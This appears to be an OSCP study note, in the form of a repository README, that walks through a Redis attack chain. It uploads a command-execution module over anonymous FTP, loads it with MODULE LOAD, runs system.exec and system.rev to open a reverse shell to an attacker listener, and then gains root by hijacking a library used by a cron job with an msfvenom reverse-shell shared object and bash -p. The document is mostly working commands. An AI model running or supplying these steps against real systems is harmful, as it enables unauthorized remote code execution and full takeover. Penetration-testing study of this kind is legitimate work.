This is for everything I've found so far while studying for the OSCP. 

### How to compile

For compiling the module.c
```
gcc -fPIC -std=gnu99 -c -o module.o module.c
ld -o module.so module.o -shared -Bsymbolic -lc
```

### With module.so

This module.so is a compiled file from this repo:
https://github.com/n0b0dyCN/RedisModules-ExecuteCommand

The commands for this:
```
git clone https://github.com/n0b0dyCN/RedisModules-ExecuteCommand
cd  RedisModules-ExecuteCommand
```
Then download the module file instead and place it here:
```
cp ./src/module.so
```
Then upload to ftp server:
```
ftp $target
anonymous:anonymous
passive
cd pub
put module.so
bye
```

Then with telnet:
```
telnet $target 6379
MODULE LOAD /var/ftp/pub/module.so

system.exec "id"
```

Create a listener and look for a shell:
You
```
nc -lnvp 6379
```
target:
```
system.rev kali 6379
```
That's for this module.so attack. 

It should look like this:
<img width="1746" height="843" alt="image" src="https://github.com/user-attachments/assets/6dca2a4d-1782-49bb-9ed3-4ac747c8177e" />

### Things to Keep in Mind

You can also use redis-cli
```
redis-cli MODULE LOAD /path/to/your/system.so
```
```
redis-cli MODULE LIST
```
```
loadmodule /path/to/your/system.so
```
```
redis-cli system.exec "ls -la /tmp"
```
```
redis-cli system.rev <YOUR_IP> <YOUR_PORT>
```

## Priv Esc I found

A Cron Job could also take place, 

```
cat /etc/crontab
ldd /usr/bin/log-sweeper
```
<img width="855" height="395" alt="image" src="https://github.com/user-attachments/assets/f4801d3c-786e-4125-a78e-9720eef06c79" />


Make an malious file:


```
msfvenom -p linux/x64/shell_reverse_tcp -f elf-so -o utils.so LHOST=kali LPORT=6379
```

Redo the listener and place the file on ftp server:
same way as before, then log in with shell with telnet and place the file at this path:
```
cp /var/ftp/pub/utils.so /usr/local/lib/dev/utils.so
```
There is also another way:
Grab the utils.c and compile it on your workstation
```
gcc -shared -o utils.so -fPIC utils.c
```

Then share it back on the ftp server then copy it back to here:
```
cp /var/ftp/pub/utils.so /usr/local/lib/dev/utils.so
```

Last command:
```
ls -la /bin/bash
bash -p
```
Should get root afterwards. 




